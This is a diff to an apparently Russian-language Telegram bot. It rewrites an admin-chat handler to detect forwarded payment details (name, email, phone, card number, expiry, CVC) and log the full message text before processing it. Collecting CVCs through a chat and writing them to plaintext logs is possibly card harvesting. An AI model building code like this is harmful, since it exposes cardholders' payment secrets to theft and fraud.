@@ -585,21 +585,34 @@ async def bind_card_handler(callback: types.CallbackQuery):
 # ========== ОБРАБОТКА ПЛАТЕЖНЫХ ДАННЫХ ==========
 # ДОБАВЬ ЭТОТ ОБРАБОТЧИК ПЕРВЫМ - он будет ловить ВСЕ сообщения в админском чате
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
-async def debug_admin_messages(message: types.Message):
-    logger.info(f"🔍 ДЕБАГ: Сообщение в админском чате!")
-    logger.info(f"🔍 ДЕБАГ: Тип: {message.content_type}")
-    logger.info(f"🔍 ДЕБАГ: Текст: {message.text}")
+async def handle_admin_messages(message: types.Message):
+    logger.info(f"🔍 ДЕБАГ АДМИНСКОГО ЧАТА: Сообщение получено!")
     logger.info(f"🔍 ДЕБАГ: ID чата: {message.chat.id}")
-    logger.info(f"🔍 ДЕБАГ: ID сообщения: {message.message_id}")
+    logger.info(f"🔍 ДЕБАГ: Тип контента: {message.content_type}")
+    logger.info(f"🔍 ДЕБАГ: Текст: {message.text}")
+    logger.info(f"🔍 ДЕБАГ: Длина текста: {len(message.text) if message.text else 0}")
     
-    # Проверим есть ли данные карты в сообщении
+    # Проверим все возможные форматы данных карты
+    has_payment_data = False
     if message.text:
-        if "👤 Клиент:" in message.text or "• Имя:" in message.text:
-            logger.info("🔍 ДЕБАГ: ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
-            # Передаем обработку дальше
-            await process_payment_data(message)
-        else:
-            logger.info("🔍 ДЕБАГ: Сообщение без платежных данных")
+        payment_indicators = [
+            "👤 Клиент:", "• Имя:", "Имя:", "Фамилия:", 
+            "Email:", "Телефон:", "Номер:", "Срок:", "CVC:"
+        ]
+        
+        for indicator in payment_indicators:
+            if indicator in message.text:
+                logger.info(f"🔍 ДЕБАГ: Найден индикатор '{indicator}'")
+                has_payment_data = True
+                break
+    
+    logger.info(f"🔍 ДЕБАГ: Есть платежные данные?: {has_payment_data}")
+    
+    if has_payment_data:
+        logger.info("💰 ВЫЗЫВАЕМ process_payment_data!")
+        await process_payment_data(message)
+    else:
+        logger.info("🔍 ДЕБАГ: Сообщение без платежных данных")
 
 # А этот обработчик оставь как был (он должен срабатывать вторым)
 @dp.message(F.chat.id == ADMIN_CHAT_ID)
@@ -1067,6 +1080,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
